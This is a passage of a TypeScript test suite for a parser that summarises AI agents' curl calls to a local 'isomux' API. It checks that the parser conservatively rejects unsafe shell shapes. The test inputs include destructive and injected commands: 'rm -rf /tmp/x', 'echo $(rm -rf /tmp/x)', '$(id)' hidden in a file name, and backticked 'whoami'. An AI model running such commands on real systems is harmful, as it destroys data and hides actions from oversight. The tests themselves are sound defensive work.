    // -n ignores the heredoc entirely - a card would misattribute it.
    expect(
      parseIsomuxCurl(`jq -nRs '{a: 1}' <<'EOF' | ${CURL_TAIL}\nx\nEOF`),
    ).toBeNull();
    // Two input files, or a file without -Rs, stay raw.
    expect(
      parseIsomuxCurl(`jq -Rs '{text: .}' /tmp/a /tmp/b | ${CURL_TAIL}`),
    ).toBeNull();
    expect(
      parseIsomuxCurl(`jq '.[0]' /tmp/input.json | ${CURL_TAIL}`),
    ).toBeNull();
  });

  test("rejects malformed or out-of-grammar heredocs", () => {
    // Unterminated body.
    expect(
      parseIsomuxCurl(`jq -Rs '{text: .}' <<'EOF' | ${CURL_TAIL}\nbody only`),
    ).toBeNull();
    // Trailing command after the terminator.
    expect(
      parseIsomuxCurl(
        `jq -Rs '{text: .}' <<'EOF' | ${CURL_TAIL}\nbody\nEOF\nrm -rf /tmp/x`,
      ),
    ).toBeNull();
    // Tab-stripping and herestring forms.
    expect(
      parseIsomuxCurl(`jq -Rs '{text: .}' <<-'EOF' | ${CURL_TAIL}\nbody\nEOF`),
    ).toBeNull();
    expect(
      parseIsomuxCurl(`jq -Rs '{text: .}' <<<'body' | ${CURL_TAIL}`),
    ).toBeNull();
    // Heredoc attached past the producer stage.
    expect(
      parseIsomuxCurl(`jq -n '{a: 1}' | ${CURL_TAIL} <<'EOF'\nbody\nEOF`),
    ).toBeNull();
    // (A heredoc feeding curl directly IS now carded - see the "curl-fed
    // heredoc body" suite below.)
    // A second heredoc on the same line.
    expect(
      parseIsomuxCurl(
        `jq -Rs '{text: .}' <<'EOF' <<'EOG' | ${CURL_TAIL}\nbody\nEOF`,
      ),
    ).toBeNull();
  });

  test("humanize works through a heredoc-resolved body", () => {
    const req = parseIsomuxCurl(
      `jq -Rs '{text: .}' <<'EOF' | ${CURL_TAIL}\nhello\nEOF`,
    );
    expect(
      humanizeIsomuxRequest(req!, (id) => (id === "agent-1" ? "Bob" : null)),
    ).toBe("Send a message to Bob");
  });
});

describe("parseIsomuxCurl curl-fed heredoc body", () => {
  // The standard Codex message-POST: curl reads its body straight from a
  // heredoc on stdin (`-d @- <<'JSON'`), no jq producer in between.
  const POST = (delim: string, body: string, flag = "-d") =>
    `curl -s -X POST localhost:4000/api/agents/agent-1/messages -H "Authorization: Bearer $T" -H 'Content-Type: application/json' ${flag} @- <<${delim}\n${body}\n${delim.replace(/['"]/g, "")}`;

  test("literal JSON object body resolves to card fields", () => {
    const req = parseIsomuxCurl(POST("'JSON'", `{"text":"hello there"}`));
    expect(req).not.toBeNull();
    expect(req!.method).toBe("POST");
    expect(req!.action).toBe("Send agent message");
    expect(req!.bodyFields).toEqual([{ key: "text", value: "hello there" }]);
    expect(req!.bodyNote).toBeNull();
    expect(req!.bodyRaw).toBeNull();
    expect(req!.hasAuth).toBe(true);
  });

  test("multi-line JSON body (whitespace collapsed in field values)", () => {
    const req = parseIsomuxCurl(
      POST("'EOF'", `{\n  "text": "line one\\nline two",\n  "urgent": true\n}`),
    );
    expect(req!.bodyFields).toEqual([
      { key: "text", value: "line one line two" },
      { key: "urgent", value: "true" },
    ]);
  });

  test("nested JSON values stringify compactly, like the -d path", () => {
    const req = parseIsomuxCurl(
      POST("'EOF'", `{"scope":"room","meta":{"a":1,"b":[2,3]}}`),
    );
    expect(req!.bodyFields).toEqual([
      { key: "scope", value: "room" },
      { key: "meta", value: '{"a":1,"b":[2,3]}' },
    ]);
  });

  test("all @-interpreting data flags read the heredoc as the body", () => {
    for (const flag of ["-d", "--data", "--data-binary", "--data-ascii"]) {
      const req = parseIsomuxCurl(POST("'JSON'", `{"text":"hi"}`, flag));
      expect(req, flag).not.toBeNull();
      expect(req!.bodyFields).toEqual([{ key: "text", value: "hi" }]);
    }
  });

  test("double-quoted delimiter takes the body literally too", () => {
    const req = parseIsomuxCurl(POST(`"END"`, `{"text":"hi"}`));
    expect(req!.bodyFields).toEqual([{ key: "text", value: "hi" }]);
  });

  test("unquoted delimiter with an expansion-free body resolves to fields", () => {
    const req = parseIsomuxCurl(POST("EOF", `{"text":"plain body"}`));
    expect(req!.bodyFields).toEqual([{ key: "text", value: "plain body" }]);
  });

  test("unquoted delimiter with $VAR/backtick/backslash notes only, never resolves", () => {
    // The shell would expand these before curl sees them; the card must not
    // present pre-expansion text as the payload. Quoted-delimiter equivalents
    // ARE resolved (next test), so this is specifically the expansion guard.
    for (const body of [
      `{"text":"costs $HOME"}`,
      '{"text":"`whoami`"}',
      `{"text":"a\\\\b"}`,
    ]) {
      const req = parseIsomuxCurl(POST("EOF", body));
      expect(req, body).not.toBeNull();
      expect(req!.bodyFields).toBeNull();
      expect(req!.bodyNote).toBe("body from heredoc");
    }
    // Same body under a quoted delimiter is literal -> fields.
    expect(
      parseIsomuxCurl(POST("'EOF'", `{"text":"costs $HOME"}`))!.bodyFields,
    ).toEqual([{ key: "text", value: "costs $HOME" }]);
  });

  test("literal but non-JSON body collapses to a note", () => {
    const req = parseIsomuxCurl(POST("'EOF'", `just some prose, not json`));
    expect(req).not.toBeNull();
    expect(req!.bodyNote).toBe("body from heredoc");
    expect(req!.bodyFields).toBeNull();
    expect(req!.bodyRaw).toBeNull();
  });

  test("non-object JSON (array/scalar) and empty body note only", () => {
    expect(parseIsomuxCurl(POST("'EOF'", `[1,2,3]`))!.bodyNote).toBe(
      "body from heredoc",
    );
    expect(parseIsomuxCurl(POST("'EOF'", `"hi"`))!.bodyNote).toBe(
      "body from heredoc",
    );
    // Empty heredoc body: JSON.parse("") throws -> note.
    const empty = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/api/agents/agent-1/messages -d @- <<'EOF'\nEOF`,
    );
    expect(empty!.bodyNote).toBe("body from heredoc");
  });

  test("carries a display pipe tail after the heredoc curl", () => {
    const req = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/api/agents/agent-1/messages -d @- <<'EOF' | jq '.ok'\n{"text":"hi"}\nEOF`,
    );
    expect(req).not.toBeNull();
    expect(req!.bodyFields).toEqual([{ key: "text", value: "hi" }]);
    expect(req!.pipeTail).toBe(`| jq '.ok'`);
  });

  test("surfaces an output redirect on the heredoc curl", () => {
    const req = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/api/agents/agent-1/messages -d @- <<'EOF' > /tmp/ack.json\n{"text":"hi"}\nEOF`,
    );
    expect(req).not.toBeNull();
    expect(req!.bodyFields).toEqual([{ key: "text", value: "hi" }]);
    expect(req!.outputFile).toBe("/tmp/ack.json");
  });

  test("unknown isomux route still cards, just without an action label", () => {
    // The real Codex shape often hits /agents/<id>/message (singular, no /api).
    const req = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/agents/agent-1/message -d @- <<'JSON'\n{"text":"hi"}\nJSON`,
    );
    expect(req).not.toBeNull();
    expect(req!.method).toBe("POST");
    expect(req!.action).toBeNull();
    expect(req!.bodyFields).toEqual([{ key: "text", value: "hi" }]);
  });

  test("humanize works through a heredoc-fed body", () => {
    const req = parseIsomuxCurl(
      POST("'JSON'", `{"text":"hi","deliverAt":"x"}`),
    );
    expect(
      humanizeIsomuxRequest(req!, (id) => (id === "agent-1" ? "Bob" : null)),
    ).toBe("Schedule a message to Bob");
  });

  // --- conservatism: shapes that must stay raw ---

  test("a heredoc curl never reads (no @- data flag) stays raw", () => {
    // Heredoc present but no `-d @-`: curl ignores stdin, so carding it as a
    // plain request would hide the heredoc body. Bail.
    expect(
      parseIsomuxCurl(
        `curl -s localhost:4000/api/agents/agent-1/messages <<'EOF'\n{"text":"hi"}\nEOF`,
      ),
    ).toBeNull();
    // Inline -d content alongside the heredoc: stdin is unread.
    expect(
      parseIsomuxCurl(
        `curl -s -X POST localhost:4000/api/tasks -d '{"title":"x"}' <<'EOF'\nignored\nEOF`,
      ),
    ).toBeNull();
  });

  test("--data-raw @- does not read stdin, so the heredoc shape stays raw", () => {
    // curl treats @ literally under --data-raw; the heredoc is never the body.
    expect(
      parseIsomuxCurl(
        `curl -s -X POST localhost:4000/api/tasks --data-raw @- <<'EOF'\n{"title":"x"}\nEOF`,
      ),
    ).toBeNull();
  });

  test("two @- body args stay raw", () => {
    expect(
      parseIsomuxCurl(
        `curl -s -X POST localhost:4000/api/tasks -d @- -d @- <<'EOF'\n{"a":1}\nEOF`,
      ),
    ).toBeNull();
  });

  test("out-of-grammar heredocs feeding curl stay raw", () => {
    const HC = `curl -s -X POST localhost:4000/api/tasks -d @-`;
    // herestring
    expect(parseIsomuxCurl(`${HC} <<<'{"a":1}'`)).toBeNull();
    // tab-stripping
    expect(parseIsomuxCurl(`${HC} <<-'EOF'\n{"a":1}\nEOF`)).toBeNull();
    // unterminated
    expect(parseIsomuxCurl(`${HC} <<'EOF'\n{"a":1}`)).toBeNull();
    // trailing command after terminator
    expect(
      parseIsomuxCurl(`${HC} <<'EOF'\n{"a":1}\nEOF\nrm -rf /tmp/x`),
    ).toBeNull();
    // two heredocs
    expect(parseIsomuxCurl(`${HC} <<'EOF' <<'EOG'\n{"a":1}\nEOF`)).toBeNull();
    // an active (non-filter) pipe stage after the heredoc curl
    expect(
      parseIsomuxCurl(`${HC} <<'EOF' | curl example.com -d @-\n{"a":1}\nEOF`),
    ).toBeNull();
  });

  test("heredoc feeding a non-isomux curl stays raw", () => {
    expect(
      parseIsomuxCurl(
        `curl -s -X POST https://example.com/api -d @- <<'EOF'\n{"a":1}\nEOF`,
      ),
    ).toBeNull();
  });
});

describe("describeIsomuxRoute", () => {
  test("matches with query strings and trailing slashes", () => {
    expect(describeIsomuxRoute("GET", "/api/tasks?status=all")).toBe(
      "List tasks",
    );
    expect(describeIsomuxRoute("GET", "/api/tasks/")).toBe("List tasks");
    expect(describeIsomuxRoute("GET", "/api/tasks")).toBe("List tasks");
  });

  test("wildcards match exactly one segment", () => {
    expect(describeIsomuxRoute("POST", "/api/tasks/abc/claim")).toBe(
      "Claim task",
    );
    expect(describeIsomuxRoute("POST", "/api/tasks/a/b/claim")).toBeNull();
  });

  test("method must match", () => {
    expect(describeIsomuxRoute("DELETE", "/api/memory")).toBeNull();
  });

  test("agent context and instructions reads are labeled", () => {
    expect(describeIsomuxRoute("GET", "/api/agents/agent-123/context")).toBe(
      "Check context usage",
    );
    expect(
      describeIsomuxRoute("GET", "/api/agents/agent-123/instructions"),
    ).toBe("Read agent instructions");
  });

  test("version read is labeled", () => {
    expect(describeIsomuxRoute("GET", "/api/version")).toBe(
      "Check isomux version",
    );
  });
});

describe("humanizeIsomuxRequest", () => {
  function parse(cmd: string) {
    const req = parseIsomuxCurl(cmd);
    expect(req).not.toBeNull();
    return req!;
  }

  test("memory reads phrase the scope", () => {
    expect(
      humanizeIsomuxRequest(
        parse("curl -s 'localhost:4000/api/memory?scope=agent'"),
      ),
    ).toBe("Read memories for this agent");
    expect(
      humanizeIsomuxRequest(
        parse("curl -s 'localhost:4000/api/memory?scope=office'"),
      ),
    ).toBe("Read office memories");
  });

  test("memory append uses the body scope", () => {
    const req = parse(
      `curl -s -X POST localhost:4000/api/memory -H 'Content-Type: application/json' -d '{"scope":"room","text":"x"}'`,
    );
    expect(humanizeIsomuxRequest(req)).toBe("Save a room memory");
  });

  test("agent message resolves the receiver name", () => {
    const req = parse(
      `curl -s -X POST localhost:4000/api/agents/agent-123-abc/messages -H 'Content-Type: application/json' -d '{"text":"hi"}'`,
    );
    expect(
      humanizeIsomuxRequest(req, (id) =>
        id === "agent-123-abc" ? "Isomuxer4" : null,
      ),
    ).toBe("Send a message to Isomuxer4");
  });

  test("deliverAt turns send into schedule", () => {
    const req = parse(
      `curl -s -X POST localhost:4000/api/agents/agent-123-abc/messages -d '{"text":"hi","deliverAt":"2026-01-01T00:00:00Z"}'`,
    );
    expect(humanizeIsomuxRequest(req, () => "Todoer")).toBe(
      "Schedule a message to Todoer",
    );
  });

  test("unresolved agent ids fall back to the raw id", () => {
    const req = parse(
      `curl -s -X POST localhost:4000/api/agents/agent-9/abort -d '{}'`,
    );
    expect(humanizeIsomuxRequest(req)).toBe("Interrupt agent-9");
  });

  test("task claim includes id and assignee", () => {
    const req = parse(
      `curl -s -X POST localhost:4000/api/tasks/28ab9400/claim -H 'Content-Type: application/json' -d '{"assignee":"Isomuxer1"}'`,
    );
    expect(humanizeIsomuxRequest(req)).toBe(
      "Claim task 28ab9400 for Isomuxer1",
    );
  });

  test("task list variants by status param", () => {
    expect(
      humanizeIsomuxRequest(parse("curl -s localhost:4000/api/tasks")),
    ).toBe("List open tasks");
    expect(
      humanizeIsomuxRequest(
        parse("curl -s 'localhost:4000/api/tasks?status=all'"),
      ),
    ).toBe("List all tasks");
  });

  test("unknown route returns null", () => {
    const req = parse("curl -s localhost:4000/api/does-not-exist");
    expect(humanizeIsomuxRequest(req)).toBeNull();
  });
});

describe("agent discovery route label", () => {
  test("GET /agents and /api/agents get the manifest label", () => {
    const req = parseIsomuxCurl(
      `curl -s localhost:4000/agents -H "Authorization: Bearer $ISOMUX_AGENT_TOKEN"`,
    );
    expect(req).not.toBeNull();
    expect(req!.action).toBe("List office agents");
    expect(humanizeIsomuxRequest(req!)).toBe("List office agents");
    expect(describeIsomuxRoute("GET", "/api/agents")).toBe(
      "List office agents",
    );
  });
});

describe("parseIsomuxCurl output-to-file", () => {
  test("stdout redirect to a plain path parses and surfaces the path", () => {
    const req = parseIsomuxCurl(
      "curl -s localhost:4000/api/tasks > /tmp/tasks.json",
    );
    expect(req).not.toBeNull();
    expect(req!.path).toBe("/api/tasks");
    expect(req!.outputFile).toBe("/tmp/tasks.json");
    expect(req!.outputAppend).toBe(false);
  });

  test("no-space and fd-1 forms parse", () => {
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks >/tmp/t.json")!
        .outputFile,
    ).toBe("/tmp/t.json");
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks 1> /tmp/t.json")!
        .outputFile,
    ).toBe("/tmp/t.json");
  });

  test("append redirect parses with outputAppend", () => {
    const req = parseIsomuxCurl(
      "curl -s localhost:4000/api/tasks >> /tmp/log.txt",
    );
    expect(req!.outputFile).toBe("/tmp/log.txt");
    expect(req!.outputAppend).toBe(true);
  });

  test("-o / --output with a real path parses and surfaces the path", () => {
    const req = parseIsomuxCurl(
      "curl -s -o /tmp/out.json localhost:4000/api/tasks",
    );
    expect(req!.outputFile).toBe("/tmp/out.json");
    expect(req!.outputAppend).toBe(false);
    expect(
      parseIsomuxCurl(
        "curl -s --output /tmp/out.json localhost:4000/api/tasks",
      )!.outputFile,
    ).toBe("/tmp/out.json");
  });

  test("redirect works on the curl stage of a jq producer pipeline", () => {
    const req = parseIsomuxCurl(
      `jq -n --arg text "hi" '{text: $text}' | curl -s -X POST localhost:4000/api/agents/a1/messages -H "Authorization: Bearer $ISOMUX_AGENT_TOKEN" -d @- > /tmp/ack.json`,
    );
    expect(req).not.toBeNull();
    expect(req!.outputFile).toBe("/tmp/ack.json");
  });

  test("silent /dev/null tolerances are unchanged (no outputFile)", () => {
    const req = parseIsomuxCurl(
      "curl -s -o /dev/null localhost:4000/api/tasks 2>/dev/null",
    );
    expect(req).not.toBeNull();
    expect(req!.outputFile).toBeNull();
  });

  test("conservative bails: stderr-to-file, two outputs, odd paths, pipe combo", () => {
    // stderr to a file stays raw
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks 2> /tmp/err.log"),
    ).toBeNull();
    // two output targets stays raw
    expect(
      parseIsomuxCurl(
        "curl -s -o /tmp/a.json localhost:4000/api/tasks > /tmp/b.json",
      ),
    ).toBeNull();
    // path with characters outside the allowlist stays raw
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks > '/tmp/my file.json'"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks > /tmp/$(id).json"),
    ).toBeNull();
    // file output combined with a display pipe stays raw
    expect(
      parseIsomuxCurl(
        "curl -s localhost:4000/api/tasks > /tmp/t.json | jq '.'",
      ),
    ).toBeNull();
    // redirect on the jq stage of a producer pipeline stays raw
    expect(
      parseIsomuxCurl(
        `jq -n '{a: 1}' > /tmp/x | curl -s -X POST localhost:4000/api/tasks -d @-`,
      ),
    ).toBeNull();
    // file redirects inside a display-filter tail still stay raw
    expect(
      parseIsomuxCurl(
        "curl -s localhost:4000/api/tasks | jq '.' > /tmp/t.json",
      ),
    ).toBeNull();
  });
});

// Codex (and some tool harnesses) run every command wrapped as
// `/bin/bash -lc '<script>'`, so the raw command never starts with curl/jq.
// The parser unwraps a bare single-statement wrapper and re-parses the inner
// script under the same conservative rules.
describe("parseIsomuxCurl bash -lc wrapper (Codex)", () => {
  test("unwraps /bin/bash -lc 'curl ...' and cards the inner request", () => {
    const req = parseIsomuxCurl(
      `/bin/bash -lc 'curl -s localhost:4000/api/tasks'`,
    );
    expect(req).not.toBeNull();
    expect(req!.method).toBe("GET");
    expect(req!.path).toBe("/api/tasks");
    expect(req!.action).toBe("List tasks");
  });

  test("unwraps a POST with headers and a JSON body", () => {
    const req = parseIsomuxCurl(
      `/bin/bash -lc 'curl -s -X POST localhost:4000/api/agents/agent-123-abc/messages -H "Authorization: Bearer $ISOMUX_AGENT_TOKEN" -H "Content-Type: application/json" -d "{\\"text\\":\\"hi\\"}"'`,
    );
    expect(req).not.toBeNull();
    expect(req!.action).toBe("Send agent message");
    expect(req!.hasAuth).toBe(true);
    expect(req!.bodyFields).toEqual([{ key: "text", value: "hi" }]);
  });

  test("bare `bash -c` / `sh -c` / split `-l -c` forms all unwrap", () => {
    expect(
      parseIsomuxCurl(`bash -c 'curl -s localhost:4000/api/tasks'`),
    ).not.toBeNull();
    expect(
      parseIsomuxCurl(`sh -c 'curl -s localhost:4000/api/tasks'`),
    ).not.toBeNull();
    expect(
      parseIsomuxCurl(`/usr/bin/bash -lc 'curl -s localhost:4000/api/tasks'`),
    ).not.toBeNull();
    expect(
      parseIsomuxCurl(`bash -l -c 'curl -s localhost:4000/api/tasks'`),
    ).not.toBeNull();
  });

  test("unwraps a wrapped display-pipe tail", () => {
    const req = parseIsomuxCurl(
      `/bin/bash -lc "curl -s localhost:4000/api/tasks | jq '.tasks'"`,
    );
    expect(req).not.toBeNull();
    expect(req!.pipeTail).toBe("| jq '.tasks'");
  });

  test("does NOT unwrap a non-isomux inner command", () => {
    expect(parseIsomuxCurl(`/bin/bash -lc 'curl -s example.com'`)).toBeNull();
    expect(parseIsomuxCurl(`/bin/bash -lc 'ls -la'`)).toBeNull();
  });

  test("does NOT unwrap compound inner scripts (stay raw)", () => {
    // command substitution / assignment / extra statements are still compound
    expect(
      parseIsomuxCurl(
        `/bin/bash -lc 'cd /tmp && curl -s localhost:4000/api/tasks'`,
      ),
    ).toBeNull();
    expect(
      parseIsomuxCurl(
        `/bin/bash -lc 'payload=$(cat x); curl -s localhost:4000/api/tasks'`,
      ),
    ).toBeNull();
  });

  test("does NOT unwrap other shells or wrappers", () => {
    expect(
      parseIsomuxCurl(`zsh -c 'curl -s localhost:4000/api/tasks'`),
    ).toBeNull();
    expect(
      parseIsomuxCurl(`env bash -c 'curl -s localhost:4000/api/tasks'`),
    ).toBeNull();
    // extra positional args after the script ($0/$1) - bail
    expect(
      parseIsomuxCurl(`bash -c 'curl -s localhost:4000/api/tasks' name arg1`),
    ).toBeNull();
  });

  test("does NOT unwrap `-n` noexec (syntax-check only, curl never runs)", () => {
    // -n = read but do not execute; carding it would claim a request that
    // never happened. Only -l and -c are whitelisted in the flag cluster.
    expect(
      parseIsomuxCurl(`bash -nc 'curl -s localhost:4000/api/tasks'`),
    ).toBeNull();
    expect(
      parseIsomuxCurl(`sh -nc 'curl -s localhost:4000/api/tasks'`),
    ).toBeNull();
    expect(
      parseIsomuxCurl(`bash -n -c 'curl -s localhost:4000/api/tasks'`),
    ).toBeNull();
    // an unrecognized behavior flag also bails
    expect(
      parseIsomuxCurl(`bash -xc 'curl -s localhost:4000/api/tasks'`),
    ).toBeNull();
  });

  test("a heredoc-fed curl inside the wrapper is unwrapped and carded", () => {
    // The wrapper is unwrapped and the inner `curl -d @- <<EOF` re-parsed, the
    // same recursion that already handles a wrapped `jq ... <<EOF | curl -d @-`
    // producer. (A single-quoted wrapper here - no outer-shell expansion - so
    // the extracted body is exactly what curl sends.)
    const req = parseIsomuxCurl(
      `/bin/bash -lc 'curl -s -X POST localhost:4000/api/agents/a/messages -d @- <<'EOF'\n{"text":"hi"}\nEOF'`,
    );
    expect(req).not.toBeNull();
    expect(req!.action).toBe("Send agent message");
    expect(req!.bodyFields).toEqual([{ key: "text", value: "hi" }]);
  });
});

// The outer shell of a double-quoted wrapper expands $VAR/backticks in the
// heredoc body BEFORE the inner curl reads it. tokenize keeps the pre-expansion
// spelling, so a naive card would show `$LEAKED` as an exact field even though
// curl sends its value. outerExpandsBody catches exactly the expansion-active
// case and marks the body non-literal; protected $ (single-quote breakout,
// escaped \$) still cards its fields.
describe("parseIsomuxCurl wrapped-heredoc outer-shell expansion", () => {
  test("outer double-quoted wrapper expands a bare $VAR -> note, never a field", () => {
    // {"text":"$LEAKED"} inside `bash -lc "..."`: the outer shell expands
    // $LEAKED, so the literal spelling must NOT be shown as the body.
    const req = parseIsomuxCurl(
      `/bin/bash -lc "curl -s -X POST localhost:4000/api/agents/a/messages -d @- <<'EOF'\n{\\"text\\":\\"$LEAKED\\"}\nEOF"`,
    );
    expect(req).not.toBeNull();
    expect(req!.action).toBe("Send agent message");
    expect(req!.bodyFields).toBeNull();
    expect(req!.bodyNote).toBe("body from heredoc");
  });

  test("outer double-quoted wrapper with special/positional params ($?, $$) -> note", () => {
    // The outer shell expands $? and $$ too - a narrower "$ followed by a
    // letter" match would wrongly present these as exact fields.
    const req = parseIsomuxCurl(
      `/bin/bash -lc "curl -s -X POST localhost:4000/api/agents/a/messages -d @- <<'EOF'\n{\\"text\\":\\"status $?, pid $$\\"}\nEOF"`,
    );
    expect(req).not.toBeNull();
    expect(req!.action).toBe("Send agent message");
    expect(req!.bodyFields).toBeNull();
    expect(req!.bodyNote).toBe("body from heredoc");
  });

  test("same shape feeding a jq producer stays raw (jq path takes only literal bodies)", () => {
    expect(
      parseIsomuxCurl(
        `/bin/bash -lc "jq -Rs '{text: .}' <<'EOF' | curl -s -X POST localhost:4000/api/agents/a/messages -d @-\ncosts $LEAKED now\nEOF"`,
      ),
    ).toBeNull();
  });

  test("an escaped \\$ in a double-quoted wrapper is literal -> still cards fields", () => {
    // The outer shell does not expand \$HOME; curl sends the literal text.
    const req = parseIsomuxCurl(
      `/bin/bash -lc "curl -s -X POST localhost:4000/api/agents/a/messages -d @- <<'EOF'\n{\\"text\\":\\"cost \\$HOME today\\"}\nEOF"`,
    );
    expect(req).not.toBeNull();
    expect(req!.bodyFields).toEqual([
      { key: "text", value: "cost $HOME today" },
    ]);
  });

  test("a single-quote-protected $ in a double-quoted wrapper still cards fields", () => {
    // The body's $HOME sits in a `"..."'...'"..."` single-quote breakout (the
    // real Codex shape): the wrapper's double-quote is CLOSED with an unescaped
    // `"`, $HOME is single-quoted, then the double-quote reopens. The outer
    // shell leaves $HOME verbatim, so it is safe to resolve.
    const req = parseIsomuxCurl(
      `/bin/bash -lc "curl -s -X POST localhost:4000/api/agents/a/messages -d @- <<'EOF'\n{\\"text\\":\\"see "'$HOME'" now\\"}\nEOF"`,
    );
    expect(req).not.toBeNull();
    expect(req!.bodyFields).toEqual([{ key: "text", value: "see $HOME now" }]);
  });

  test("outer-active $ in the auth header (not the body) does not block the card", () => {
    // $ISOMUX_AGENT_TOKEN is on the header line (before the body); the body
    // itself is clean, so it still resolves to fields.
    const req = parseIsomuxCurl(
      `/bin/bash -lc "curl -s -X POST localhost:4000/api/agents/a/messages -H \\"Authorization: Bearer $ISOMUX_AGENT_TOKEN\\" -d @- <<'EOF'\n{\\"text\\":\\"plain body\\"}\nEOF"`,
    );
    expect(req).not.toBeNull();
    expect(req!.hasAuth).toBe(true);
    expect(req!.bodyFields).toEqual([{ key: "text", value: "plain body" }]);
  });
});

// Agents constantly chain a small inspection command onto a curl - save the
// response and check its size, POST and `echo` a confirmation. The whole
// command used to fall back to raw rendering because the tokenizer bails on
// `;`. These shapes are carded, with the trailing statements shown verbatim.
describe("parseIsomuxCurl trailing ;/&& statements", () => {
  test("the reported shape: save to a file, then wc it", () => {
    const req = parseIsomuxCurl(
      `curl -s "localhost:4000/api/tasks?status=all" -H "Authorization: Bearer $ISOMUX_AGENT_TOKEN" > /tmp/tasks.json; wc -c /tmp/tasks.json`,
    );
    expect(req).not.toBeNull();
    expect(req!.method).toBe("GET");
    expect(req!.path).toBe("/api/tasks?status=all");
    expect(req!.hasAuth).toBe(true);
    expect(req!.outputFile).toBe("/tmp/tasks.json");
    expect(req!.trailingCommand).toBe("; wc -c /tmp/tasks.json");
  });

  test("`&& echo` after a discarded response (the most common shape)", () => {
    const req = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/api/agents/agent-123-abc/diff -d '{}' >/dev/null && echo posted`,
    );
    expect(req).not.toBeNull();
    expect(req!.method).toBe("POST");
    expect(req!.outputFile).toBeNull();
    expect(req!.trailingCommand).toBe("&& echo posted");
  });

  test("-o file then head, and a pipe tail plus a trailing statement", () => {
    expect(
      parseIsomuxCurl(
        "curl -s -o /tmp/out.json localhost:4000/api/tasks; head /tmp/out.json",
      )!.trailingCommand,
    ).toBe("; head /tmp/out.json");
    const piped = parseIsomuxCurl(
      "curl -s localhost:4000/api/tasks | head -c 100; echo",
    );
    expect(piped!.pipeTail).toBe("| head -c 100");
    expect(piped!.trailingCommand).toBe("; echo");
  });

  test("several trailing statements, stderr silencing, and internal pipes", () => {
    expect(
      parseIsomuxCurl(
        "curl -s localhost:4000/api/tasks > /tmp/t.json; echo; ls -la /tmp/t.json 2>/dev/null",
      )!.trailingCommand,
    ).toBe("; echo; ls -la /tmp/t.json 2>/dev/null");
    expect(
      parseIsomuxCurl(
        "curl -s localhost:4000/api/tasks > /tmp/t.json; cat /tmp/t.json | jq '.[] | .title'",
      )!.trailingCommand,
    ).toBe("; cat /tmp/t.json | jq '.[] | .title'");
  });

  test("a stream-merging `2>&1` is not mistaken for a separator", () => {
    const req = parseIsomuxCurl(
      "curl -s localhost:4000/api/tasks 2>&1 | head -50; echo",
    );
    expect(req).not.toBeNull();
    expect(req!.pipeTail).toBe("| head -50");
    expect(req!.trailingCommand).toBe("; echo");
  });

  test("no trailing statement leaves the field null", () => {
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks")!.trailingCommand,
    ).toBeNull();
  });

  test("the wrapper path picks up trailing statements too", () => {
    const req = parseIsomuxCurl(
      `/bin/bash -lc 'curl -s localhost:4000/api/tasks > /tmp/t.json; wc -c /tmp/t.json'`,
    );
    expect(req).not.toBeNull();
    expect(req!.path).toBe("/api/tasks");
    expect(req!.trailingCommand).toBe("; wc -c /tmp/t.json");
  });

  test("a `;` inside a quoted argument is not a separator", () => {
    const single = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/api/tasks -d '{"title":"a; b"}'`,
    );
    expect(single!.bodyFields).toEqual([{ key: "title", value: "a; b" }]);
    expect(single!.trailingCommand).toBeNull();
    const double = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/api/tasks -d "{\\"title\\":\\"a; b\\"}"`,
    );
    expect(double!.bodyFields).toEqual([{ key: "title", value: "a; b" }]);
    expect(double!.trailingCommand).toBeNull();
    // An ESCAPED separator is an argument to curl, not a statement boundary:
    // it must not split (the command then bails on the junk positional args,
    // which is the honest reading - bash passes them to curl).
    expect(
      parseIsomuxCurl(String.raw`curl -s localhost:4000/api/tasks \; echo hi`),
    ).toBeNull();
  });

  test("separators and spacing are preserved exactly", () => {
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks ;echo a  && ls b")!
        .trailingCommand,
    ).toBe(";echo a  && ls b");
  });

  test("an empty stage rejects rather than being skipped", () => {
    expect(parseIsomuxCurl("curl -s localhost:4000/api/tasks;")).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks && ; echo"),
    ).toBeNull();
  });

  test("a disallowed LATER stage rejects the whole card", () => {
    // Not just the first trailing statement: every one is gated, and a
    // forbidden construct anywhere in the remainder (backticks, `$(`) is
    // caught by the same tokenize() the head goes through.
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks; echo ok; git status"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks; echo `id`"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks; echo a || echo b"),
    ).toBeNull();
  });

  test("conservative bails: second request, control flow, non-inspection commands", () => {
    const raw = [
      // Two requests: the card can only describe one, so raw is the honest
      // rendering (the single most common chained shape after `&& echo`).
      "curl -s -X POST localhost:4000/api/tasks/a1/done -d '{}' && curl -s localhost:4000/api/tasks",
      // Control flow and backgrounding.
      "curl -s localhost:4000/api/tasks && echo up || echo down",
      "curl -s localhost:4000/api/tasks & echo backgrounded",
      "curl -s localhost:4000/api/tasks ;; echo x",
      // Commands outside the inspection allowlist.
      "curl -s localhost:4000/api/tasks > /tmp/t.json; git add -A",
      "curl -s localhost:4000/api/tasks; cd /tmp",
      "curl -s localhost:4000/api/tasks; python3 -c 'import os'",
      // A file redirect inside the trailing statement.
      "curl -s localhost:4000/api/tasks > /tmp/t.json; wc -c /tmp/t.json > /tmp/size",
      // Command substitution in the trailing statement.
      "curl -s localhost:4000/api/tasks; echo $(rm -rf /tmp/x)",
      // A heredoc body can hold an unquoted `;`, so heredoc + trailing is not
      // split at all and stays raw.
      `curl -s -X POST localhost:4000/api/agents/a/messages -d @- <<'EOF'\n{"text":"one; two"}\nEOF\nwc -c /tmp/t.json`,
    ];
    for (const command of raw) {
      expect(parseIsomuxCurl(command)).toBeNull();
